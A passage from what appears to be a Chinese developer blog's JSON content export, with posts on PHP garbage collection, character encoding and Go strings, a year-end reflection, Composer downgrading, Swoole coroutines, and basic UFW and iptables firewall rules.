&#x3D; $strxdebug_debug_zval(&#39;str&#39;); 输出结果： 1str:(refcount&#x3D;2, is_ref&#x3D;0)string &#39;hello, php&#39; (length&#x3D;10) 这时，引用次数是 2，这是因为同一个变量容器被变量a 和变量b 关联，当任何关联到的某个变量容器离开它的作用域（比如：函数执行结束），或者对变量调用了 unset() 函数，refcount的值就会 -1，当没必要时，PHP 不会再去复制已生成的变量容器，变量容器在refcount的值变为 0 时，就会被销毁。 3. 数组型的变量123&lt;?php$arr &#x3D; [&#39;a&#39;&#x3D;&gt;&#39;hello&#39;, &#39;b&#39;&#x3D;&gt;&#39;php&#39;];xdebug_debug_zval(&#39;arr&#39;); 输出结果： 12345arr:(refcount&#x3D;2, is_ref&#x3D;0)array (size&#x3D;2) &#39;a&#39; &#x3D;&gt; (refcount&#x3D;1, is_ref&#x3D;0)string &#39;hello&#39; (length&#x3D;5) &#39;b&#39; &#x3D;&gt; (refcount&#x3D;1, is_ref&#x3D;0)string &#39;php&#39; (length&#x3D;3) 4. 引用赋值1234&lt;?php$str &#x3D; &quot;hello, php&quot;;$str_bak &#x3D; &amp;$str;xdebug_debug_zval(&#39;str&#39;); 输出结果： 1str:(refcount&#x3D;2, is_ref&#x3D;1)string &#39;hello, php&#39; (length&#x3D;10) is_ref = 1表示被引用次数为 1。 5. 销毁变量12345678&lt;?php$a &#x3D; &quot;new string&quot;;$c &#x3D; $b &#x3D; $a;xdebug_debug_zval( &#39;a&#39; );unset( $b, $c );xdebug_debug_zval( &#39;a&#39; );unset( $a);xdebug_debug_zval( &#39;a&#39; ); 输出结果： 123a:(refcount&#x3D;3, is_ref&#x3D;0)string &#39;new string&#39; (length&#x3D;10)a:(refcount&#x3D;1, is_ref&#x3D;0)string &#39;new string&#39; (length&#x3D;10)a: no such symbol 可以看到当销毁变量a之后，与之包含类型的值和变量容器就会从内存中删除。 测试垃圾回收机制下面用一个比较经典的内存泄露例子来测试垃圾回收机制，通过创建一个对象，这个对象中的一个属性被设置为对象本身，在下一个循环（iteration）中，当脚本中的变量被重新赋值时，就会发生内存泄漏。 12345678910111213&lt;?phpclass Foo&#123; public $var &#x3D; &#39;3.1415962654&#39;;&#125;for ( $i &#x3D; 0; $i &lt;&#x3D; 1000000; $i++ )&#123; $a &#x3D; new Foo; $a-&gt;self &#x3D; $a;&#125;echo memory_get_peak_usage(), &quot;\\n&quot;; 以我本地的机器为例，分别在打开/关闭垃圾回收机制（通过配置 zend.enable_gc实现）的情况下运行脚本，并记录时间。 1234567$ time php -dzend.enable_gc&#x3D;0 -dmemory_limit&#x3D;-1 -n get_memory.php440776744php -dzend.enable_gc&#x3D;0 -dmemory_limit&#x3D;-1 -n 0.22s user 0.23s system 39% cpu 1.145 total$ time php -dzend.enable_gc&#x3D;1 -dmemory_limit&#x3D;-1 -n get_memory.php4839240php -dzend.enable_gc&#x3D;1 -dmemory_limit&#x3D;-1 -n 0.42s user 0.03s system 76% cpu 0.588 total 这个测试并不能代表真实应用程序的情况，但是它的确显示了新的垃圾回收机制在内存占用方面的好处。而且在执行中出现更多的循环引用变量时，内存节省会更多。 垃圾回收相关配置可以通过修改配置文件 php.ini 中的 zend.enable_gc 来打开或关闭 PHP 的垃圾回收机制。 刚好借着PHP 的垃圾回收这个主题解释一个问题：PHP 是否可以常驻内存？ 答案是：传统的PHP 无法以常驻内存的方式运行。 这是因为PHP 是一种解释型脚本语言，这种运行机制使得每个PHP 页面解释执行完之后，所有资源都被回收掉了。 不过好在Swoole 的出现为PHP 弥补了这一缺陷（这里用缺陷这个词并不合适，毕竟每一种语言工具应该尽可能扬长避短）。 参考链接 PHP二十一问：PHP的垃圾回收机制 引用计数基本知识解释垃圾回收机制","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"}]},{"title":"字符串与编码","slug":"string-and-encoding","date":"2021-01-03T15:20:47.000Z","updated":"2021-01-04T00:04:03.300Z","comments":true,"path":"string-and-encoding/","link":"","permalink":"https://www.0x2beace.com/string-and-encoding/","excerpt":"因为计算机只能处理数字，如果需要处理文本，就需要先将文本转换为数字才能处理。最早的计算机在设计时采用8个比特（bit）作为一个字节（byte），所以，一个字节能表示的最大的整数就是255（二进制 11111111=十进制255 ）。","text":"因为计算机只能处理数字，如果需要处理文本，就需要先将文本转换为数字才能处理。最早的计算机在设计时采用8个比特（bit）作为一个字节（byte），所以，一个字节能表示的最大的整数就是255（二进制 11111111=十进制255 ）。 由于计算机是美国人发明的，因此，最早只有127个字符被编码到计算机里，也就是大小写英文字母、数字和一些符号，这个编码表被称为ASCII编码。 但是要处理中文显然一个字节是不够的，至少需要两个字节，而且还不能和ASCII编码冲突，所以，中国制定了GB2312编码，用来把中文编进去。 可以想到的是，全世界有上百种语言，各国有各国的标准，就会不可避免地出现冲突，结果就是编码方式和解码方式不同，就会导致乱码。 因此，Unicode字符集应运而生。Unicode把所有语言都统一到一套编码里，这样就不会再有乱码问题了。 不过新的问题因此又出现了：如果统一成 Unicode 编码，乱码问题虽然是从此消失了，但是，如果你写的文本基本上全部是英文的话，用Unicode编码比ASCII编码需要多一倍的存储空间，在存储和传输上就十分不划算。 所以，本着节约的精神，又出现了把Unicode编码转化为“可变长编码”的UTF-8编码。UTF-8编码把一个Unicode字符根据不同的数字大小编码成1-6个字节，常用的英文字母被编码成1个字节，汉字通常是3个字节，只有很生僻的字符才会被编码成4-6个字节。 ASCII、Unicode和UTF-8 三者的关系是： Unicode 是一种包含所有语言的字符集编码（替代ASCII编码） UTF-8 是 Unicode 的实现方式之一 字符编码在计算机中的工作方式在计算机内存中，统一使用Unicode编码，当需要保存到硬盘或者需要传输的时候，就转换为UTF-8编码。 用记事本编辑的时候，从文件读取的UTF-8字符被转换为Unicode字符到内存里，编辑完成后，保存的时候再把Unicode转换为UTF-8保存到文件： 浏览网页的时候，服务器会把动态生成的Unicode内容转换为UTF-8再传输到浏览器： 所以你看到很多网页的源码上会有类似&lt;meta charset=&quot;UTF-8&quot; /&gt;的信息，表示该网页正是用的UTF-8编码。 Go 语言的字符串Go 语言的字符串与其他编程语言的差异： string 是数据类型，不是引用或者指针类型（其零值不是空，是一个空字符串） string 是只读的 byte slice，len函数获取的是它所包含的 byte数 string 的 byte 数组可以存放任何数据（二进制） 通过一个实际例子来理解Go 的string、Unicode、UTF8： 1234567891011121314151617package mainimport &quot;testing&quot;func TestString(t *testing.T) &#123; var s3 &#x3D; &quot;中&quot; &#x2F;&#x2F; rune 这个数据类型可以取出字符串中的 Unicode 编码 r :&#x3D; []rune(s3) &#x2F;&#x2F; byte 这个数据类型可以取出字符串的 UTF8 存储 b :&#x3D; []byte(s3) t.Log(b) &#x2F;&#x2F; [228 184 173] t.Logf(&quot;中 的Unicode 编码：%x&quot;, r[0]) t.Logf(&quot;中 的UTF8 存储：%X&quot;, s3) &#x2F;&#x2F; [0xE4, 0xB8, 0xAD]&#125; 字符 中 字在 Unicode 中的编码是0x4E2D，它的物理存储形式依赖于 UTF8规则，它在内存被存储为了E4B8AD，放在 string 对应的 byte切片中，分别对应三个 byte：[0xE4, 0xB8, 0xAD]。 其他问题 在我们的日常生活中用到的是十进制，计算机用的是二进制，那么为什么还会出现十六进制呢？ 这是因为使用二进制表示数据太长了，可读性十分差，正好十六是二的四次方，所以一位十六进制可以表示四位二进制。 参考连接 字符串和编码——廖雪峰的官方网站 字符编码笔记：ASCII，Unicode 和 UTF-8","categories":[{"name":"Golang","slug":"Golang","permalink":"https://www.0x2beace.com/categories/Golang/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"https://www.0x2beace.com/tags/Golang/"}]},{"title":"二零二零年终总结","slug":"2020-year-end-summary","date":"2020-12-31T16:17:16.000Z","updated":"2021-03-02T14:22:00.544Z","comments":true,"path":"2020-year-end-summary/","link":"","permalink":"https://www.0x2beace.com/2020-year-end-summary/","excerpt":"回顾整个二零二零年于我而言最大的收获大概是：找到了方向，知道自己该做什么了。","text":"回顾整个二零二零年于我而言最大的收获大概是：找到了方向，知道自己该做什么了。 在此前，我一直处于“不确定”状态，不确定是否要选择这条路，不确定是否足够热爱，不确定是否能坚持下去。 而此刻，我很清晰地知道自己该做些什么，想要些什么。 这篇博客主要从生活、工作、学习、思考、分享以及未来这几个方面简单总结下过去的一年。 关于生活这部分放在这里其实有些多余，即便如此，我还是想表达出来，也许会有共鸣者呢。 生活中的我，日常很简单。绝大部分时间都是宅在家里，不喜欢外出或者说不擅长社交。以前很少会觉得这样的日子是否会太孤独了。 不知为何，今年这种感觉尤其强烈。 生活在这个时代的我们似乎都太孤独了，无论是什么社会阶层、什么职业背景、什么性别状态，人就是孤独的。 渴望交流，却找不到合适的人; 渴望被爱，却害怕被伤害; 不久前看过一部电影《秒数五厘米》，里面有一句话给我的印象特别深刻——即使通了一千条短信，我们的心也只能拉近一厘米而已。 结合自己前些日子的一段经历，确实是这样，若只是排解寂寞，谁都可以取代。 关于工作一谈到干我们这一行的，很多人可能第一反应可能就是加班，我并不反对加班，只是我们在加班时，应该思考一下为什么加班？ 是因为效率太低，本该工作时间内完成的事情，没有完成？ 是因为事情太多？ 还是只是因为老板没有走？ 当我在谈论加班时，我谈些什么——不加没有意义的班。 关于学习前段时间工作上出了一点事故——因为实体机没有设置防火墙导致被病毒入侵。 防火墙在我的印象中属于那种底层比较高深，晦涩难懂的东西，再加上基础知识的匮乏让我对防火墙频频感到恐惧。 如果对整体没有清晰的认识，只是盲目的网上搜查着别人写好的规则，运气好，可能能解决;运气不好，可能还会导致服务器连接不上，别问我是怎么知道的… 而当需要面临比较复杂的定制化需求时，就更寸步难行了。 关于学习，这也是我一直想提醒自己的：务实基础，不要做“知识的搬运工”。 附一张讽刺当代的开发者的图 不知何时，技术圈越来越喜欢贩卖焦虑了，每天醒来，面对大多都是这样的信息： “关于 XXX 的那些你不知道的真相” “吐血整理，万字长文搞定 XXX” “全网最硬核解读 XXX 底层原理” “搞定这道 XXX 面试题，大厂随便进” “字节内部疯传的一份 XXX 失传资料” … 从侧面也反映出国内的软件开发者承担的职业发展压力。 和大部分人一样，我也时常会焦虑，但还是要对未来持乐观态度，毕竟高级人才无论何时都是紧缺的。 事实上，我们不得不承认一个残酷的事实——大部分从业者只是在做重复性、创新价值低的工作。这些工作在一定程度上会逐渐被取代，这不意味着这些工作会被取缔，而是更高效的完成。 通俗一点讲就是一个高手可以取代N 个低手。 关于思考我一直觉得有三件事情在我们这个时代中极为重要，他们分别是： 编程 写作 英语 编程毋庸置疑，技术改变世界。 写作在这个信息爆炸的时代，为知识付费的行为已经逐渐被接受，付费渠道成为有效的过滤手段，也促使原创作者输出更高质量的内容。 当然写作能力并不是一蹴而就，需要不断积累、实践、总结。 从出来后，我就有一直刻意保持这个习惯，大多数时候我会选择用文字来记录（博客也是一种记录方式），可能是觉得用文字记录的方式更真实一些，回头看到那些写满地文字，会发现不知不觉中已经陪伴我走了这么远。 英语第三件事是我一直想要做，却还没有开始做（或者说没有坚持下去）。因为我一直认同一个观点：如果你英文不行，你基本与高手无缘了。 如何成功做好一件事如何成功做好一件事情？给我最大的感触就是，一定要具备以下两个因素： 兴趣 成就感 前者是开始的动力，后者是坚持下去的动力。 关于分享为什么要写博客？ 一方面，阶段性地对一些知识进行总结，方便自己日后需要时查找。 另一方面，我一直觉得知识不是篮子里面的鸡蛋，不会因为你分享给他人而减少，相反，你会收获到更多其他的东西，这也是我开始写博客的初衷。 时至今日，小破站成立了六个月，刚好一百八十天。累计发文一百余篇，虽然不是每篇都是千字长文，但每篇都是经过思考一个字一个字码出来的。 可无奈整体访客却少得可怜，这不禁让我陷入沉思，是否有必要把部分精华内容发布到微信公众号上。 目前还没有公众号，创建一个公众号并不难，难的是如何取一个不错地名字及维护好这个公众号。 而对于取名字这件事情，我向来并不擅长，所以这件事情就一直被闲置了。 关于未来马上就要迎来新的一年了，免不了制定计划为新的一年做好准备。我这个人似乎从来都不缺计划，缺的是完成计划的执行力。相比于计划本身，似乎更应该关注完成计划的效率。 创建一个公众号？ 掌握 Go 语言 务实计算机组成原理、操作系统原理、数据结构及计算机网络基础 至少完成一百道 LeetCode 题目 继续坚持跑步 最后的最后用一段我比较喜欢的话，作为结束语： 你可以抱怨，你可以哭泣，可你要知道明天太阳还是一样会升起，你只需要知道这个世界对谁都是一样的，你过得很累，其他人也一样没有顺风顺水。累了，就去被窝里冥想发呆; 渴了，就穿上毛绒兔的拖鞋哒哒下楼，买一杯冰镇柠檬茶，或者去路边煮一碗热气腾腾的牛肉面;闻一闻路边的野菊，看几部幽默或感人的电影;哪怕这一切只是为了取悦那个心情不好的自己。最后，多多努力，努力做一个可爱的人，一个闪闪发光的人，不讨好，不将就，对过往的苦难情深意重，但绝不回头，你只需要一路向前，披荆斩棘就好，别忘了，带着笑：）","categories":[{"name":"年终总结","slug":"年终总结","permalink":"https://www.0x2beace.com/categories/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"}],"tags":[{"name":"年终总结","slug":"年终总结","permalink":"https://www.0x2beace.com/tags/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"}]},{"title":"理解 Go 语言中的字符串和字节数组","slug":"understand-strings-and-byte-arrays-in-Go","date":"2020-12-30T15:57:13.000Z","updated":"2021-01-04T10:47:06.213Z","comments":true,"path":"understand-strings-and-byte-arrays-in-Go/","link":"","permalink":"https://www.0x2beace.com/understand-strings-and-byte-arrays-in-Go/","excerpt":"最近在学习Go 语言时，遇到一个很有意思的问题，记录一下。","text":"最近在学习Go 语言时，遇到一个很有意思的问题，记录一下。 第一次使用redisgo 时，有点懵，怎么取出来的数据跟我存的完全不一样？ 123456789101112131415161718package mainimport ( &quot;fmt&quot; &quot;github.com&#x2F;gomodule&#x2F;redigo&#x2F;redis&quot;)func main() &#123; conn, _ :&#x3D; redis.Dial(&quot;tcp&quot;, &quot;127.0.0.1:6379&quot;) defer conn.Close() conn.Send(&quot;SET&quot;, &quot;hello&quot;, &quot;hello&quot;) conn.Send(&quot;GET&quot;, &quot;hello&quot;) conn.Flush() v, _ :&#x3D; conn.Receive() fmt.Println(v)&#125; 打印结果： 1[104 101 108 108 111] 当看到这个打印结果时，咦～我明明存进去的是一个 hello，怎么取出来却成了一个数组？ 要回答这个问题，就得了解Go 语言中的字符串这个数据结构了。 认识字符串字符串是Go 语言中最常用的基础数据类型之一，虽然字符串往往是被看作是一个整体，但实际上字符串是一块连续的内存空间，也可以理解成是一个由字符组成的数组。 字符串虽然在 Go 语言中是基本类型 string（hello），但是它其实就是字符组成的数组（[104 101 108 108 111]）。 作为数组来说，它会占用一片连续的内存空间，这片连续的内存空间就存储了一些字节，这些字节共同组成了字符串。 Go 语言中的字符串是一个只读的字节数组切片。 尝试将数组切片转换成字符串： 12345678910111213package mainimport &quot;fmt&quot;func main() &#123; &#x2F;&#x2F; 注意这里的数据类型是 uint8，而不是 int、uint sli :&#x3D; []uint8&#123;104, 101, 108, 108, 111&#125; fmt.Println(sli) fmt.Printf(&quot;%T \\n&quot;, sli) fmt.Println(string(sli)) fmt.Printf(&quot;%T \\n&quot;, string(sli))&#125; 打印结果： 1234[104 101 108 108 111][]uint8 hellostring 来看看hello这个字符串在内存中的存储方式： 你可能会问：0x68、0x65、0x6c、0x6c、0x6f这些东西是什么？ 他们是hello 这个字符串的切片数组的每一个字符的ASCII码所对应的十六进制： h =&gt; 104 =&gt; 0x68 e =&gt; 101 =&gt; 0x65 l =&gt; 108 =&gt; 0x6c l =&gt; 108 =&gt; 0x6c o =&gt; 111 =&gt; 0x6f 声明字符串在Go 语言中，有两种字面量方式可以声明一个字符串，一种是使用双引号，另一种则是使用反引号： 12str1 :&#x3D; &quot;this is a string&quot;str2 :&#x3D; &#96;this is another&#96; 使用双引号声明的字符串其实和其他语言中的字符串声明没有太多区别，它只能用于简单、单行的字符串。 并且如果字符串内部出现双引号时需要使用 \\ 符号来避免编译器解析错误，而使用反引号则可以很好的摆脱这一限制。 在遇到需要写 JSON 或者其他数据格式的场景下非常方便，下面两个 JSON 字符串的写法都没问题，但显然第二种方式更简洁、自然、便于阅读。 12str1 :&#x3D; &quot;&#123;\\&quot;page\\&quot;: 1, \\&quot;fruits\\&quot;: [\\&quot;apple\\&quot;, \\&quot;pear\\&quot;]&#125;&quot;str2 :&#x3D; &#96;&#123;&quot;page&quot;: 1, &quot;fruits&quot;: [&quot;apple&quot;, &quot;pear&quot;]&#125;&#96; 参考链接 谈 Golang 中的字符串和字节数组","categories":[{"name":"Golang","slug":"Golang","permalink":"https://www.0x2beace.com/categories/Golang/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"https://www.0x2beace.com/tags/Golang/"}]},{"title":"Composer 2.0 向下不兼容导致扩展安装出错","slug":"composer-2-0-backward-incompatibility-causes-extension-installation-error","date":"2020-12-17T12:40:38.000Z","updated":"2020-12-17T12:41:30.424Z","comments":true,"path":"composer-2-0-backward-incompatibility-causes-extension-installation-error/","link":"","permalink":"https://www.0x2beace.com/composer-2-0-backward-incompatibility-causes-extension-installation-error/","excerpt":"今天在部署服务器环境时，遇到一个由Composer 版本向下不兼容而引发的问题，记录一下。","text":"今天在部署服务器环境时，遇到一个由Composer 版本向下不兼容而引发的问题，记录一下。 问题描述后台Api 应用是用ThinkPHP6.0 的多应用模式开发的，起初部署时，总是提示找不到控制器。 当时就比较郁闷，怎么会找不到控制器呢？这个异常通常只会在没有开启多应用模式时才会出现，可是我明明已经开启了多应用模式，也安装了相关扩展（Composer 2.0.x 执行 composer install 没有直接抛出异常）。 正当我百思不得其解时，不经意间看到了我目前所使用的 Composer 版本是 2.0.x。 回头对比了一下我本地的版本：1.8，Google 一下才发现Composer 2.0 系列是最近才发布的，于是马上就想到了是否是 Composer 向下不兼容导致。 好家伙，真的是兼容性导致的问题： 解决办法既然是版本过高导致的兼容性问题，那就好办了，直接降低版本即可。 Composer 降级非常简单，不用重新编译安装，直接使用以下命令即可： 1composer self-update 1.8.0 如果你不知道有哪些版本可选择，可以查看官方的发布历史。 参考链接 ThinkPHP V6.0.5版本发布——兼容Composer2.0 Composer 中文文档","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Composer","slug":"Composer","permalink":"https://www.0x2beace.com/tags/Composer/"}]},{"title":"Swoole 协程快速上手","slug":"swoole-coroutine-quick-start","date":"2020-12-15T13:37:42.000Z","updated":"2020-12-15T13:38:38.874Z","comments":true,"path":"swoole-coroutine-quick-start/","link":"","permalink":"https://www.0x2beace.com/swoole-coroutine-quick-start/","excerpt":"最近有幸读到 daydaygo 的 swoole 协程初体验，一文从协程的执行的角度窥探 Swoole 的协程调度，并详细说明了为什么协程会快。","text":"最近有幸读到 daydaygo 的 swoole 协程初体验，一文从协程的执行的角度窥探 Swoole 的协程调度，并详细说明了为什么协程会快。 文章通俗易懂，笔者在此基础上增加了一些自己的理解，以此成文。 主要从以下两个方面来了解协程： 协程的执行顺序：协程调度 协程为什么快：减少IO阻塞带来的性能优势 协程执行顺序按照惯例，先来看一个最简单的协程代码。 12345678910&lt;?phpgo(function () &#123; echo &quot;1&quot;.PHP_EOL;&#125;);echo &quot;2&quot;.PHP_EOL;go(function () &#123; echo &quot;3&quot;.PHP_EOL;&#125;); 在Swoole中 Swoole\\Coroutine::create 等价于 go 函数（Swoole\\Coroutine 前缀的类名可以映射为 Co），用于创建一个协程。 该函数接受一个回调函数作为参数，回调函数的内容就是协程需要执行的内容。 上面的代码执行结果为： 123123 从执行结果的角度来看，协程版的代码和传统的同步代码，看起来并无差异。但协程的实际执行过程却是： 运行上面那段协程代码，生成一个新进程 当代码执行到go()部分时，会在当前协程中创建一个协程，输出1，协程退出 代码继续向下执行，输出 2 再次遇到go()函数，输出3 协程退出，进程退出，执行完成 协程调度\\Co::sleep() 函数和sleep()函数差不多，但是它模拟的是 IO 等待。 123456789101112&lt;?phpgo(function () &#123; &#x2F;&#x2F; 只新增了一行代码 Co::sleep(1); echo &quot;1&quot;.PHP_EOL;&#125;);echo &quot;2&quot;.PHP_EOL;go(function () &#123; echo &quot;3&quot;.PHP_EOL;&#125;); 执行结果如下： 123231 怎么不是顺序执行的了？实际执行过程： 运行上面那段协程代码，生成一个新进程 遇到 go()，在当前进程中创建一个协程 协程向下执行遇到IO 阻塞，协程让出控制，进入协程调度队列 进程继续向下执行，输出 2 创建第二个协程，输出3 第一个协程准备就绪，输出 1 协程退出，进程退出，执行完成 到这里，已经可以看到Swoole 中协程与进程的关系，以及协程调度的过程。 下面这张图可以很清晰的看到二者区别与联系： 协程快在哪里？大家使用协程，听到最多的原因，可能就是因为协程快。那协程相比传统同步代码倒底快在哪里呢？ 首先，我们来了解一下计算机中的两类任务。 CPU密集型CPU 密集型也叫计算密集型， 特点是需要进行大量科学计算，比如计算圆周率、对视频进行高清解码，吃CPU。 IO 密集型涉及到网络、磁盘IO的任务都是IO密集型任务，特点是不吃CPU，任务的大部分时间都在等待IO操作完成，因为IO的速度远远低于CPU和内存的速度。 其次需要了解两个概念： 并行：同一时刻，同一CPU只能执行一个任务，要N个任务同时执行，就需要有多个CPU 才行。 并发：同一时刻执行N 个任务。由于CPU 任务切换速度非常快，已经快到了人类感知极限。 了解了这些基础之后，对协程的能力是不是也更清晰了一些，以及协程为什么会“快”了。 因为协程仅在 IO阻塞 时才会触发调度，从而减少等待IO 操作完成的时间。 协程实践通过对比下面三种情况，加深对协程的理解： 同步阻塞版： 1234567&lt;?php$n &#x3D; 4;for ($i &#x3D; 0; $i &lt; $n; $i++) &#123; sleep(1); echo $i . PHP_EOL;&#125;;echo &quot;ok&quot;; 单个协程版： 123456789&lt;?php$n &#x3D; 4;Co\\Run(function () use ($n) &#123; for ($i &#x3D; 0; $i &lt; $n; $i++) &#123; Co::sleep(1); echo $i . PHP_EOL; &#125;;&#125;);echo &quot;ok&quot;; 多个协程版1.0（IO 密集型）： 123456789&lt;?php$n &#x3D; 4;for ($i &#x3D; 0; $i &lt; $n; $i++) &#123; go(function () use ($i) &#123; Co::sleep(1); echo $i . PHP_EOL; &#125;);&#125;;echo &quot;ok&quot;; 通过 time 命令分别查看耗时时长，可以得出以下结论： 传统同步阻塞：遇到 IO阻塞，等待，导致性能损失 单协程：尽管 IO阻塞引发了协程调度，但有且只有一个协程 多协程：遇到 IO阻塞 时发生调度，IO就绪时恢复运行 多个协程版2.0（CPU 密集型）： 12345678910&lt;?php$n &#x3D; 4;for ($i &#x3D; 0; $i &lt; $n; $i++) &#123; go(function () use ($i) &#123; sleep(1); &#x2F;&#x2F; Co::sleep(1); echo $i . PHP_EOL; &#125;);&#125;;echo &quot;ok&quot;; 只是将 Co::sleep() 改成了 sleep()，会发现总耗时时长又和传统同步阻塞差不多了，这是因为： sleep() 可以看做是 CPU密集型任务, 不会引起协程的调度 Co::sleep() 模拟的是 IO密集型任务, 会引发协程的调度 这也是为什么, 协程适合 IO密集型 的应用，而不适合 CPU 密集型任务。 参考链接 swoole| swoole 协程初体验","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Swoole","slug":"Swoole","permalink":"https://www.0x2beace.com/tags/Swoole/"}]},{"title":"Swoole 常见误区及问题总结","slug":"swoole-common-mistakes-and-problems-summary","date":"2020-12-14T14:12:33.000Z","updated":"2020-12-14T14:13:55.331Z","comments":true,"path":"swoole-common-mistakes-and-problems-summary/","link":"","permalink":"https://www.0x2beace.com/swoole-common-mistakes-and-problems-summary/","excerpt":"随着对Swoole 的逐步了解，总结以下可能会碰到的误区：","text":"随着对Swoole 的逐步了解，总结以下可能会碰到的误区： Swoole 是单线程 Swoole 异步回调模块仅可用于 CLI 命令行模式 Swoole 只有同步阻塞的客户端才可在 php-fpm 中使用 Swoole 重新编译安装会自动覆盖掉之前的版本 CPU密集型任务（科学计算等）, 不会引起协程的调度; IO密集型任务（网络请求, 文件读写等）, 才会引发协程的调度 enable_coroutine 开启协程支持之后，无需使用 Co\\Run 创建协程 所有的协程必须在协程容器里面创建，Swoole 程序启动的时候大部分情况会自动创建协程容器 Swoole\\Coroutine 前缀的类名映射为 Co。使用 Co\\Run 方法创建协程容器，使用 Coroutine::create 或 go 方法创建协程。 常见问题： 什么是协程容器？ 是否可以共用 1 个 Redis 或 MySQL 连接 Call to undefined function Co\\Run()","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Swoole","slug":"Swoole","permalink":"https://www.0x2beace.com/tags/Swoole/"}]},{"title":"Linux ufw 快速上手","slug":"linux-ufw-quick-start","date":"2020-12-10T13:54:58.000Z","updated":"2020-12-14T14:15:37.375Z","comments":true,"path":"linux-ufw-quick-start/","link":"","permalink":"https://www.0x2beace.com/linux-ufw-quick-start/","excerpt":"之前已经了解了 iptables 是设置防火墙的命令行工具，但对于初学者而言，它的上手曲线太陡了。","text":"之前已经了解了 iptables 是设置防火墙的命令行工具，但对于初学者而言，它的上手曲线太陡了。 UFW （即简单防火墙）相较 iptables，对于初学者而言，则易于上手得多。 UFW 默认安装在Ubuntu上。如果由于某种原因已将其卸载，则可以使用如下命令进行安装： 1$ sudo apt install ufw 开启 IPV6 123$ sudo vim &#x2F;etc&#x2F;default&#x2F;ufwIPV6&#x3D;yes 查看UFW状态Ubuntu 默认没有开启 UFW。 1$ sudo ufw status inactive：表示防火墙关闭状态 active：表示防火墙开启状态 开启UFW123$ sudo ufw enableCommand may disrupt existing ssh connections. Proceed with operation (y|n)? yFirewall is active and enabled on system startup 初次开启 UFW 没有任何规则（如果之前已经添加过UFW 规则，则还是存在的），如需查看以开启哪些规则，同样使用ufw status命令。 关闭UFW1$ sudo ufw disable 重置所有规则1$ sudo ufw reset 允许指定端口1$ sudo ufw allow http &#x2F;&#x2F; sudo ufw allow 80 指定特定 IP使用UFW时，还可以指定IP地址。例如，如果要允许来自特定IP地址的连接，则可以使用如下命令： 1$ sudo ufw allow from &lt;ip_address&gt; 还可以通过添加to any port端口号来指定允许IP地址连接的特定端口。 例如，如果要允许 203.0.113.4 连接到端口22（SSH），则可以使用如下命令： 1$ sudo ufw allow from 203.0.113.4 to any port 22 禁止指定端口1$ sudo ufw deny https &#x2F;&#x2F; sudo ufw deny 443 删除指定规则正式删除具体规则之前，先使用如下命令查看对应编号： 1$ sudo ufw status numbered 删除指定编号对应的规则： 1$ sudo ufw delete &lt;id&gt; 检查UFW状态和规则1$ sudo ufw status verbose 重新载入配置1$ sudo ufw reload 注意事项⚠️： 修改了某条规则之后，需要让UFW 重新加载配置，设定规则才会生效。 谨慎禁用 ssh，否则可能会导致自己也连接不上。 在启用 UFW 之前，最好检查或者重置一下规则。 参考链接 How To Set Up a Firewall with UFW on Ubuntu 18.04 在 Ubuntu 中用 UFW 配置防火墙","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"防火墙","slug":"防火墙","permalink":"https://www.0x2beace.com/tags/%E9%98%B2%E7%81%AB%E5%A2%99/"},{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://www.0x2beace.com/tags/Ubuntu/"},{"name":"UFW","slug":"UFW","permalink":"https://www.0x2beace.com/tags/UFW/"}]},{"title":"Linux iptables 常用规则整理","slug":"linux-iptables-common-rules-collation","date":"2020-12-09T13:19:00.000Z","updated":"2020-12-10T13:56:03.338Z","comments":true,"path":"linux-iptables-common-rules-collation/","link":"","permalink":"https://www.0x2beace.com/linux-iptables-common-rules-collation/","excerpt":"因为手上一直管理着两台实体机（服务器），而实体机的是没有“软防”这个概念的，“硬防”规则只能自己去设定。","text":"因为手上一直管理着两台实体机（服务器），而实体机的是没有“软防”这个概念的，“硬防”规则只能自己去设定。 而Linux 原始的防火墙工具iptables 过于繁琐，上手曲线较陡，所以这篇笔记就用来整理 Linux 的 iptables 相关知识。 iptables 是什么我们常常会听到这样的说法：“iptables 是一个防火墙”，其实不是，它也不是一个系统服务，所以不能使用如下命令启动/停止/重启。 1systemctl start&#x2F;stop&#x2F;restart iptables iptables 其实只是一个命令行工具，它用来操作 netfilter 内核防火墙，所以真正应用的防火墙应该是netfilter。 当拿到一台Linux 后，iptables就在那里，默认情况下它允许所有流量。 123456789$ sudo iptables -LChain INPUT (policy ACCEPT)target prot opt source destination Chain FORWARD (policy ACCEPT)target prot opt source destination Chain OUTPUT (policy ACCEPT)target prot opt source destination 允许特定端口访问访问过程如下： 将此规则附加到输入链（-A INPUT），以便查看传入流量 检查是否为TCP（-p tcp） 如果是，检查输入是否进入端口（–dport ssh） 如果是，接受输入（-j ACCEPT） 1234iptables -A INPUT -p tcp --dport 22 -j ACCEPT # 允许访问22端口iptables -A INPUT -p tcp --dport 80 -j ACCEPT # 允许访问80端口iptables -A INPUT -p tcp --dport 443 -j ACCEPT # 允许访问443端口iptables -A FORWARD -j REJECT # 禁止其他未允许的规则访问 禁止特定端口访问1iptables -A INPUT -p tcp --dport 6379 -j DROP # 禁止6379端口传入流量 如果想要屏蔽UDP流量而不是TCP流量，只需将上述规则中的 tcp 修改为 udp 即可。 禁用防火墙如果需要临时/永久禁用iptables 防火墙，则可以使用以下命令清除所有规则： 1234sudo iptables -P INPUT ACCEPTsudo iptables -P OUTPUT ACCEPTsudo iptables -P FORWARD ACCEPTsudo iptables -F 